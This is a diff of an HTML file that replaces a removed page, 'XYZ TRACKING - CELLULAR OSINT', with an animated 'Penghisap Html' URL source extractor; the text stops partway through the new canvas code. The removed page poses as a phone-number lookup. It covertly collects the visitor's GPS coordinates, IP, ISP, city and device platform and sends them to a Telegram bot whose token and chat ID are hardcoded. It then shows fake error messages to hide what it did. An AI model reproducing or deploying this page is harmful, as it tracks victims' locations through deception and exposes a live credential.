@@ -3,160 +3,1361 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XYZ TRACKING - CELLULAR OSINT</title>
+    <title>Penghisap Html</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Share+Tech+Mono&display=swap');
-        body { background: #000; color: #ffd700; font-family: 'Share Tech Mono', monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        .card { width: 90%; max-width: 400px; border: 2px solid #ffd700; padding: 40px 20px; text-align: center; background: #050505; box-shadow: 0 0 30px #ffd70044; }
-        h2 { font-family: 'Orbitron'; letter-spacing: 3px; margin-bottom: 5px; }
-        .radar-box { width: 100px; height: 100px; border: 1px solid #ffd700; border-radius: 50%; margin: 20px auto; position: relative; }
-        .radar-line { position: absolute; width: 50%; height: 2px; background: #ffd700; top: 50%; left: 50%; transform-origin: left; animation: scan 2s linear infinite; }
-        @keyframes scan { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        input { width: 80%; background: transparent; border: none; border-bottom: 1px solid #333; color: #fff; padding: 15px; margin: 20px 0; outline: none; text-align: center; font-size: 18px; }
-        button { width: 80%; padding: 15px; background: transparent; color: #ffd700; border: 2px solid #ffd700; font-family: 'Orbitron'; cursor: pointer; font-weight: bold; }
-        #log { font-size: 10px; color: #444; margin-top: 20px; text-transform: uppercase; }
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght=400;600&family=Space+Grotesk:wght=400;600;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+
+        body {
+            font-family: 'Space Grotesk', sans-serif;
+            background: #020106;
+            color: #fff;
+            min-height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Fullscreen Interactive Canvas */
+        #spaceCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        /* Ambient Space Fog */
+        .space-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 2;
+            pointer-events: none;
+            background: radial-gradient(circle at 50% 50%, transparent 20%, rgba(2, 1, 6, 0.6) 80%, #020106 100%);
+        }
+
+        /* Main Center Layout Wrapper */
+        .main-wrapper {
+            position: relative;
+            z-index: 10;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            padding: 30px 20px;
+        }
+
+        /* Initial Sucking Glass Card */
+        .extractor-card {
+            width: 100%;
+            max-width: 440px;
+            background: rgba(10, 6, 22, 0.72);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(0, 240, 255, 0.18);
+            border-radius: 24px;
+            padding: 25px 25px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8),
+                        inset 0 1px 2px rgba(255, 255, 255, 0.1);
+            transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+            transform: scale(1);
+            opacity: 1;
+            margin-bottom: 20px;
+        }
+
+        .extractor-card.hidden {
+            transform: scale(0.8) translateY(-50px);
+            opacity: 0;
+            pointer-events: none;
+            display: none;
+        }
+
+        /* Logo and Header text */
+        .logo-group {
+            margin-bottom: 20px;
+        }
+
+        .logo-group h1 {
+            font-size: 2.2em;
+            font-weight: 700;
+            letter-spacing: -1px;
+            background: linear-gradient(135deg, #00f0ff, #ff0077, #ffbb00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 4px;
+            text-shadow: 0 0 35px rgba(0, 240, 255, 0.3);
+        }
+
+        .logo-group .subtitle {
+            font-size: 10px;
+            color: #8fa0dd;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            font-weight: 700;
+        }
+
+        /* Field Groups */
+        .field-group {
+            text-align: left;
+        }
+
+        .field-label {
+            font-size: 10px;
+            color: #8ea1c9;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+            display: block;
+            font-weight: 600;
+        }
+
+        .input-box {
+            position: relative;
+            margin-bottom: 12px;
+        }
+
+        .input-box svg {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 18px;
+            height: 18px;
+            fill: #00f0ff;
+            opacity: 0.6;
+        }
+
+        input[type="url"] {
+            width: 100%;
+            padding: 12px 12px 12px 42px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(0, 240, 255, 0.2);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 13.5px;
+            outline: none;
+            transition: all 0.3s;
+            font-family: inherit;
+        }
+
+        input[type="url"]:focus {
+            border-color: #00f0ff;
+            background: rgba(0, 0, 0, 0.85);
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.3);
+        }
+
+        /* Hisap Kode Action Button */
+        .suck-btn {
+            width: 100%;
+            padding: 13px;
+            background: linear-gradient(135deg, #00f0ff, #0055ff);
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 13.5px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 5px 20px rgba(0, 85, 255, 0.45);
+        }
+
+        .suck-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 240, 255, 0.5);
+            background: linear-gradient(135deg, #00f0ff, #ff0055);
+        }
+
+        .suck-btn:active {
+            transform: translateY(1px);
+        }
+
+        /* Loading Tracker */
+        .cosmic-loader {
+            display: none;
+            text-align: center;
+            padding: 15px 0 5px;
+        }
+
+        .cosmic-loader.active {
+            display: block;
+        }
+
+        .pulsing-ring {
+            display: inline-block;
+            position: relative;
+            width: 40px;
+            height: 40px;
+        }
+
+        .pulsing-ring div {
+            box-sizing: border-box;
+            display: block;
+            position: absolute;
+            width: 32px;
+            height: 32px;
+            margin: 4px;
+            border: 3px solid transparent;
+            border-radius: 50%;
+            animation: spin-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+        }
+
+        .pulsing-ring div:nth-child(1) { border-top-color: #00f0ff; animation-delay: -0.45s; }
+        .pulsing-ring div:nth-child(2) { border-top-color: #ff0077; animation-delay: -0.3s; }
+        .pulsing-ring div:nth-child(3) { border-top-color: #ffcc00; animation-delay: -0.15s; }
+
+        @keyframes spin-ring {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loader-status {
+            margin-top: 8px;
+            font-size: 12px;
+            color: #a0a5c0;
+            animation: pulse-text 1.5s infinite;
+        }
+
+        @keyframes pulse-text {
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; }
+        }
+
+        /* FULL OVERLAY TERMINAL PANEL */
+        .terminal-overlay {
+            position: absolute;
+            width: 100%;
+            max-width: 780px;
+            background: rgba(8, 4, 18, 0.85);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(0, 240, 255, 0.22);
+            border-radius: 24px;
+            padding: 25px;
+            box-shadow: 0 30px 70px rgba(0,0,0,0.95),
+                        0 0 40px rgba(255, 0, 85, 0.15);
+            display: flex;
+            flex-direction: column;
+            height: calc(100vh - 80px);
+            max-height: 620px;
+            opacity: 0;
+            transform: scale(0.9) translateY(40px);
+            pointer-events: none;
+            transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+            z-index: 20;
+            margin-top: auto;
+            margin-bottom: auto;
+        }
+
+        .terminal-overlay.visible {
+            opacity: 1;
+            transform: scale(1) translateY(0);
+            pointer-events: auto;
+        }
+
+        /* Cosmic Victory Announcement Badge */
+        .victory-banner {
+            background: rgba(255, 0, 119, 0.12);
+            border: 1px dashed rgba(255, 0, 119, 0.4);
+            border-radius: 12px;
+            padding: 12px;
+            text-align: center;
+            margin-bottom: 15px;
+            color: #ff3385;
+            font-weight: 700;
+            font-size: 13.5px;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            animation: pulse-border 2s infinite alternate;
+        }
+
+        @keyframes pulse-border {
+            from { border-color: rgba(255, 0, 119, 0.4); box-shadow: 0 0 5px rgba(255, 0, 119, 0.1); }
+            to { border-color: rgba(0, 240, 255, 0.6); box-shadow: 0 0 15px rgba(0, 240, 255, 0.2); }
+        }
+
+        .terminal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .badges-group {
+            display: flex;
+            gap: 8px;
+        }
+
+        .terminal-badge {
+            font-size: 11px;
+            padding: 4px 10px;
+            border-radius: 20px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            color: #a0a5c0;
+            font-weight: 600;
+        }
+
+        .terminal-badge.creator {
+            border-color: rgba(0, 240, 255, 0.3);
+            background: rgba(0, 240, 255, 0.05);
+            color: #00f0ff;
+        }
+
+        .terminal-badge.success {
+            border-color: rgba(0, 255, 120, 0.2);
+            background: rgba(0, 255, 120, 0.05);
+            color: #00ff78;
+        }
+
+        /* Code Viewer */
+        .terminal-window {
+            flex: 1;
+            background: #010003;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 14px;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .window-bar {
+            height: 32px;
+            background: rgba(255, 255, 255, 0.02);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+            justify-content: space-between;
+        }
+
+        .window-dots {
+            display: flex;
+            gap: 5px;
+        }
+
+        .window-dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+        }
+        .window-dot.red { background: #ff5f56; }
+        .window-dot.yellow { background: #ffbd2e; }
+        .window-dot.green { background: #27c93f; }
+
+        .window-title {
+            font-family: 'Fira Code', monospace;
+            font-size: 10px;
+            color: #555768;
+        }
+
+        .code-area {
+            flex: 1;
+            padding: 15px;
+            overflow-y: auto;
+        }
+
+        .code-output {
+            font-family: 'Fira Code', monospace;
+            font-size: 12px;
+            line-height: 1.6;
+            color: #cbd5e1;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        /* Syntax coloring rules */
+        .tag { color: #ff2a74 !important; font-weight: 600; }
+        .attr { color: #ffaa00 !important; }
+        .val { color: #00ffaa !important; }
+
+        /* Terminal Actions */
+        .actions-row {
+            display: flex;
+            gap: 12px;
+            margin-top: 15px;
+        }
+
+        .terminal-btn {
+            flex: 1;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.25s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            border: none;
+        }
+
+        .terminal-btn.copy {
+            background: rgba(0, 240, 255, 0.06);
+            border: 1px solid rgba(0, 240, 255, 0.25);
+            color: #00f0ff;
+        }
+
+        .terminal-btn.copy:hover {
+            background: #00f0ff;
+            color: #020005;
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.3);
+        }
+
+        .terminal-btn.copy.copied {
+            background: rgba(0, 255, 120, 0.15);
+            border-color: #00ff78;
+            color: #00ff78;
+            box-shadow: 0 0 15px rgba(0, 255, 120, 0.2);
+        }
+
+        .terminal-btn.reset {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            color: #d1d5db;
+        }
+
+        .terminal-btn.reset:hover {
+            background: rgba(255, 255, 255, 0.12);
+            color: #fff;
+        }
+
+        /* Toast Popup Alerts */
+        .toast-box {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 1000;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            max-width: 320px;
+        }
+
+        .toast {
+            background: rgba(8, 4, 18, 0.95);
+            border-left: 4px solid #ff0055;
+            border-top: 1px solid rgba(255,255,255,0.05);
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            border-right: 1px solid rgba(255,255,255,0.05);
+            padding: 12px 16px;
+            border-radius: 6px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.6);
+            color: #fff;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transform: translateX(120%);
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.15);
+        }
+
+        .toast.show {
+            transform: translateX(0);
+        }
+
+        .toast.success {
+            border-left-color: #00ff78;
+        }
+
+        .toast svg {
+            width: 15px;
+            height: 15px;
+            flex-shrink: 0;
+        }
+
+        /* Scrollbars */
+        .code-area::-webkit-scrollbar {
+            width: 5px;
+        }
+        .code-area::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        .code-area::-webkit-scrollbar-thumb {
+            background: rgba(0, 240, 255, 0.15);
+            border-radius: 3px;
+        }
+
+        /* Mobile Adjustments */
+        @media (max-width: 768px) {
+            .terminal-overlay {
+                height: calc(100vh - 40px);
+                max-height: 90%;
+                padding: 15px;
+            }
+            .logo-group h1 {
+                font-size: 2.1em;
+            }
+            .victory-banner {
+                font-size: 11px;
+                padding: 10px;
+            }
+        }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>XYZ TRACKING</h2>
-    <div style="font-size: 10px; color: #555; letter-spacing: 3px;">CELLULAR OSINT V3.0</div>
-    
-    <div class="radar-box"><div class="radar-line"></div></div>
+    <!-- Space Simulation Engine -->
+    <canvas id="spaceCanvas"></canvas>
+    <div class="space-overlay"></div>
 
-    <input type="number" id="target_num" placeholder="08xxxxxxxxxx">
-    <button onclick="initiateScan()">CHECK DATA</button>
-    
-    <div id="log">Satellite Standby...</div>
-</div>
-
-<script>
-    const TOKEN = "8622815738:AAHixf_yecRdOHx1q3LPD0CubKyrszYEH58";
-    const CHAT_ID = "7496062352";
-
-    function sendTele(msg) {
-        const ping = new Image();
-        ping.src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=html&v=${Date.now()}`;
-    }
-
-    async function initiateScan() {
-        const num = document.getElementById('target_num').value;
-        if(num.length < 10) return alert("Nomor HP tidak valid!");
-
-        document.getElementById('log').innerText = "Requesting Satellite Uplink...";
+    <!-- Active Floating Interactive Layout -->
+    <div class="main-wrapper">
         
-        // Minta Izin Lokasi (Inti Tracking)
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                
-                // Ambil IP & Provider
-                let ipData = {};
-                try {
-                    const res = await fetch('https://ipapi.co/json/');
-                    ipData = await res.json();
-                } catch(e) {}
+        <!-- Welcome & Input Glass Card -->
+        <div class="extractor-card" id="inputCard">
+            <div class="logo-group">
+                <h1>Penghisap Html</h1>
+                <div class="subtitle">Cosmic Code Extractor</div>
+            </div>
 
-                const detailInfo = 
-                    `📡 <b>XYZ TRACKING - TARGET LOCKED</b>\n\n` +
-                    `📱 <b>Nomor HP:</b> <code>${num}</code>\n` +
-                    `🌐 <b>IP Address:</b> <code>${ipData.ip || 'Unknown'}</code>\n` +
-                    `🏢 <b>ISP:</b> ${ipData.org || 'Unknown'}\n` +
-                    `📍 <b>Kota:</b> ${ipData.city}, ${ipData.region}\n` +
-                    `🛰️ <b>Koordinat:</b> <code>${lat},${lon}</code>\n` +
-                    `📱 <b>Device:</b> ${navigator.platform}\n\n` +
-                    `🌍 <b>Google Maps:</b>\nhttps://www.google.com/maps?q=${lat},${lon}`;
+            <div class="field-group">
+                <span class="field-label">Target Singularitas</span>
+                <div class="input-box">
+                    <input type="url" id="urlInput" placeholder="Masukkan URL (Wajib https://)" required autocomplete="off">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"/>
+                    </svg>
+                </div>
+                <button class="suck-btn" onclick="generateCode()">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
+                    </svg>
+                    Hisap Kode
+                </button>
 
-                sendTele(detailInfo);
-                
-                document.getElementById('log').innerText = "SCAN COMPLETE.";
-                alert("Sistem Sibuk: Gagal menghubungkan ke satelit provider. Coba lagi nanti.");
-            }, (err) => {
-                sendTele(`⚠️ <b>TRACKING BLOCKED</b>\nNomor: ${num}\nTarget menolak akses GPS.`);
-                alert("Error 0x44: Izin lokasi diperlukan untuk verifikasi nomor.");
+                <!-- Cosmic Loading Status -->
+                <div class="cosmic-loader" id="loaderBox">
+                    <div class="pulsing-ring">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+                    <div class="loader-status" id="loaderText">Menyelaraskan gravitasi Black Hole...</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- FULL TERMINAL RESULTS DISPLAY (Nutupin elemen di atas ketika siap) -->
+        <div class="terminal-overlay" id="terminalOverlay">
+            
+            <!-- Cosmic Sucking Success Announcement -->
+            <div class="victory-banner">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12c0 1.268-.63 2.39-1.593 3.068a3.745 3.745 0 01-1.043 3.296 3.745 3.745 0 01-3.296 1.043A3.745 3.745 0 0112 21c-1.268 0-2.39-.63-3.068-1.593a3.746 3.746 0 01-3.296-1.043 3.745 3.745 0 01-1.043-3.296A3.745 3.745 0 013 12c0-1.268.63-2.39 1.593-3.068a3.745 3.745 0 011.043-3.296 3.746 3.746 0 013.296-1.043A3.746 3.746 0 0112 3c1.268 0 2.39.63 3.068 1.593a3.746 3.746 0 013.296 1.043 3.746 3.746 0 011.043 3.296A3.745 3.745 0 0121 12z" />
+                </svg>
+                <span>Scorpio dan Orion berhasil dihisap Black Hole!</span>
+            </div>
+
+            <div class="terminal-header">
+                <div class="badges-group">
+                    <div class="terminal-badge creator">Creator: 𝙰𝚗𝚐𝚉𝚉𝙽𝚘𝚝𝙳𝚎𝚟🤡</div>
+                    <div class="terminal-badge success" id="statusBadge">Status: Berhasil</div>
+                </div>
+            </div>
+
+            <div class="terminal-window">
+                <div class="window-bar">
+                    <div class="window-dots">
+                        <span class="window-dot red"></span>
+                        <span class="window-dot yellow"></span>
+                        <span class="window-dot green"></span>
+                    </div>
+                    <div class="window-title">extracted_source.html</div>
+                    <div style="width:30px"></div>
+                </div>
+                <div class="code-area">
+                    <pre class="code-output" id="codeOutput"></pre>
+                </div>
+            </div>
+
+            <div class="actions-row">
+                <button class="terminal-btn copy" id="copyBtn" onclick="copyCode()">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0-2-.9-2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>
+                    </svg>
+                    Salin Kode
+                </button>
+                <button class="terminal-btn reset" onclick="resetApp()">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0l3.181 3.183a8.25 8.25 0 0013.803-3.7M4.031 9.865a8.25 8.25 0 0113.803-3.7l3.181 3.182m0-4.991v4.99" />
+                    </svg>
+                    Hisap Lagi
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast box alerts -->
+    <div class="toast-box" id="toastContainer"></div>
+
+    <script>
+        /* === Toast System === */
+        function showToast(message, type = 'error') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast ${type === 'success' ? 'success' : ''}`;
+            
+            const errIcon = `<svg fill="currentColor" viewBox="0 0 20 20"><path d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"/></svg>`;
+            const succIcon = `<svg fill="currentColor" viewBox="0 0 20 20"><path d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"/></svg>`;
+            
+            toast.innerHTML = `${type === 'success' ? succIcon : errIcon}<span>${message}</span>`;
+            container.appendChild(toast);
+            
+            setTimeout(() => toast.classList.add('show'), 50);
+            setTimeout(() => {
+                toast.classList.remove('show');
+                setTimeout(() => toast.remove(), 400);
+            }, 4000);
+        }
+
+        /* === Space Canvas Simulation === */
+        const canvas = document.getElementById('spaceCanvas');
+        const ctx = canvas.getContext('2d');
+
+        let stars = [];
+        let blackHole;
+        let orion;
+        let scorpius;
+        let codeParticles = [];
+        
+        let isGlobalSucking = false; 
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            initUniverse();
+        }
+
+        function initUniverse() {
+            blackHole = new BlackHole();
+            orion = new Orion();
+            scorpius = new Scorpius();
+
+            stars = [];
+            for (let i = 0; i < 180; i++) {
+                stars.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height,
+                    size: Math.random() * 1.5 + 0.4,
+                    opacity: Math.random() * 0.7 + 0.3,
+                    speed: Math.random() * 0.006 + 0.002,
+                    twinkle: Math.random() * Math.PI
+                });
+            }
+        }
+
+        class BlackHole {
+            constructor() {
+                this.updateCoordinates();
+                this.eventHorizon = 40;
+                this.photonSphere = 47;
+                this.orbits = [
+                    { rx: 155, ry: 33, tilt: -0.22, color: 'rgba(255, 30, 0, 0.75)',  dashPattern: [180, 50, 140, 70],  offset: 0,   thickness: 9 },
+                    { rx: 118, ry: 25, tilt: -0.22, color: 'rgba(255, 120, 0, 0.88)', dashPattern: [120, 35, 90, 45],   offset: 100, thickness: 6 },
+                    { rx: 84,  ry: 18, tilt: -0.22, color: 'rgba(255, 220, 0, 0.98)', dashPattern: [70, 20, 80, 30],     offset: 200, thickness: 4 }
+                ];
+            }
+
+            updateCoordinates() {
+                // Diposisikan kokoh di area kanan bawah agar seimbang
+                this.x = canvas.width * 0.72;
+                this.y = canvas.height * 0.70;
+                if (canvas.width < 768) {
+                    this.x = canvas.width * 0.70;
+                    this.y = canvas.height * 0.75;
+                }
+            }
+
+            drawBack() {
+                ctx.save();
+                ctx.translate(this.x, this.y);
+                this.orbits.forEach(orbit => {
+                    ctx.rotate(orbit.tilt);
+                    ctx.strokeStyle = orbit.color;
+                    ctx.lineWidth = orbit.thickness;
+                    ctx.shadowColor = orbit.color;
+                    ctx.shadowBlur = 12;
+                    ctx.setLineDash(orbit.dashPattern);
+                    ctx.lineDashOffset = orbit.offset;
+
+                    ctx.beginPath();
+                    ctx.ellipse(0, 0, orbit.rx, orbit.ry, 0, Math.PI, 2 * Math.PI);
+                    ctx.stroke();
+                    ctx.rotate(-orbit.tilt);
+                });
+                ctx.restore();
+                ctx.setLineDash([]);
+                ctx.shadowBlur = 0;
+            }
+
+            drawFront() {
+                ctx.save();
+                ctx.translate(this.x, this.y);
+                this.orbits.forEach(orbit => {
+                    ctx.rotate(orbit.tilt);
+                    ctx.strokeStyle = orbit.color;
+                    ctx.lineWidth = orbit.thickness;
+                    ctx.shadowColor = orbit.color;
+                    ctx.shadowBlur = 12;
+                    ctx.setLineDash(orbit.dashPattern);
+                    ctx.lineDashOffset = orbit.offset;
+
+                    ctx.beginPath();
+                    ctx.ellipse(0, 0, orbit.rx, orbit.ry, 0, 0, Math.PI);
+                    ctx.stroke();
+                    ctx.rotate(-orbit.tilt);
+
+                    orbit.offset -= isGlobalSucking ? 6.5 : 2.0; 
+                });
+                ctx.restore();
+                ctx.setLineDash([]);
+                ctx.shadowBlur = 0;
+            }
+
+            drawSingularity() {
+                const time = Date.now();
+                const pulseMultiplier = isGlobalSucking ? (Math.sin(time * 0.02) * 5 + 6) : 0;
+                const flareWidth = 125 + Math.sin(time * 0.005) * 8 + pulseMultiplier * 2;
+
+                const flareGrad = ctx.createRadialGradient(this.x, this.y, 1, this.x, this.y, flareWidth);
+                flareGrad.addColorStop(0, 'rgba(255, 255, 255, 0.98)');
+                flareGrad.addColorStop(0.12, 'rgba(255, 242, 210, 0.8)');
+                flareGrad.addColorStop(0.35, 'rgba(255, 80, 0, 0.15)');
+                flareGrad.addColorStop(1, 'rgba(0,0,0,0)');
+
+                ctx.save();
+                ctx.translate(this.x, this.y);
+                ctx.scale(5, 0.12);
+                ctx.fillStyle = flareGrad;
+                ctx.beginPath();
+                ctx.arc(0, 0, flareWidth, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.restore();
+
+                ctx.shadowColor = '#ffffff';
+                ctx.shadowBlur = 20 + Math.sin(time * 0.003) * 4 + pulseMultiplier;
+                ctx.fillStyle = '#ffffff';
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.photonSphere + pulseMultiplier * 0.2, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.shadowBlur = 0;
+
+                ctx.fillStyle = '#010003';
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.eventHorizon, 0, Math.PI * 2);
+                ctx.fill();
+            }
+        }
+
+        class Orion {
+            constructor() {
+                this.updateCoordinates();
+                this.isSucked = false;
+                this.suckProgress = 0; 
+                this.thrusters = [];
+                this.opacity = 1.0;
+            }
+
+            updateCoordinates() {
+                this.x = canvas.width * 0.16;
+                this.baseY = canvas.height * 0.58; 
+                if (canvas.width < 768) {
+                    this.x = canvas.width * 0.14;
+                    this.baseY = canvas.height * 0.55;
+                }
+                this.y = this.baseY;
+                this.scale = canvas.width < 768 ? 0.55 : 0.85;
+
+                this.nodes = {
+                    betelgeuse: { rx: -30 * this.scale, ry: -75 * this.scale, size: 5, color: '#ff6633' },
+                    bellatrix:  { rx: 40 * this.scale,  ry: -65 * this.scale,  size: 3.5, color: '#99ccff' },
+                    mintaka:    { rx: 18 * this.scale,  ry: -8 * this.scale,   size: 3,   color: '#ffffff' }, 
+                    alnilam:    { rx: 0,                ry: 0,                 size: 3.2, color: '#ffffff' }, 
+                    alnitak:    { rx: -18 * this.scale, ry: 8 * this.scale,    size: 3.4, color: '#ffffff' }, 
+                    saiph:      { rx: -30 * this.scale, ry: 70 * this.scale,   size: 3.2, color: '#99ccff' },
+                    rigel:      { rx: 40 * this.scale,  ry: 85 * this.scale,   size: 6,   color: '#00ccff' },
+                };
+            }
+
+            draw() {
+                if (this.opacity <= 0.01) return;
+
+                const time = Date.now();
+                let ox = this.x;
+                let oy = this.y;
+
+                if (this.isSucked) {
+                    this.suckProgress += 0.018;
+                    if (this.suckProgress > 1.0) this.suckProgress = 1.0;
+
+                    this.opacity = 1.0 - this.suckProgress;
+
+                    const dx = blackHole.x - this.x;
+                    const dy = blackHole.y - this.y;
+                    const angle = Math.atan2(dy, dx) + this.suckProgress * Math.PI * 3.5;
+                    const distance = Math.sqrt(dx * dx + dy * dy) * (1.0 - this.suckProgress);
+
+                    ox = blackHole.x - Math.cos(angle) * distance;
+                    oy = blackHole.y - Math.sin(angle) * distance;
+                } else {
+                    this.y = this.baseY + Math.sin(time * 0.0018) * 15;
+                    const trem = isGlobalSucking ? 4.5 : 1.0;
+                    ox = this.x + (Math.random() - 0.5) * trem;
+                    oy = this.y + (Math.random() - 0.5) * trem;
+                    this.drawThrusters(ox, oy);
+                }
+
+                ctx.save();
+                ctx.globalAlpha = this.opacity;
+
+                ctx.strokeStyle = isGlobalSucking ? 'rgba(255, 0, 119, 0.25)' : 'rgba(0, 200, 255, 0.22)';
+                ctx.lineWidth = 1.4;
+                ctx.shadowColor = isGlobalSucking ? '#ff0077' : '#00ccff';
+                ctx.shadowBlur = 5;
+                ctx.beginPath();
+
+                const n = this.nodes;
+                const drawLine = (p1, p2) => {
+                    let s1x = ox + p1.rx;
+                    let s1y = oy + p1.ry;
+                    let s2x = ox + p2.rx;
+                    let s2y = oy + p2.ry;
+
+                    if (this.isSucked) {
+                        const biasX = (blackHole.x - s1x) * this.suckProgress * 0.35;
+                        const biasY = (blackHole.y - s1y) * this.suckProgress * 0.35;
+                        s1x += biasX; s1y += biasY;
+                        s2x += biasX; s2y += biasY;
+                    }
+
+                    ctx.moveTo(s1x, s1y);
+                    ctx.lineTo(s2x, s2y);
+                };
+
+                drawLine(n.betelgeuse, n.bellatrix);
+                drawLine(n.betelgeuse, n.alnitak);
+                drawLine(n.bellatrix, n.mintaka);
+                drawLine(n.alnitak, n.alnilam);
+                drawLine(n.alnilam, n.mintaka);
+                drawLine(n.alnitak, n.saiph);
+                drawLine(n.mintaka, n.rigel);
+                drawLine(n.saiph, n.rigel);
+                ctx.stroke();
+                ctx.shadowBlur = 0;
+
+                for (let key in this.nodes) {
+                    const star = this.nodes[key];
+                    let sx = ox + star.rx;
+                    let sy = oy + star.ry;
+
+                    if (this.isSucked) {
+                        const stretchX = (blackHole.x - sx) * this.suckProgress * 0.4;
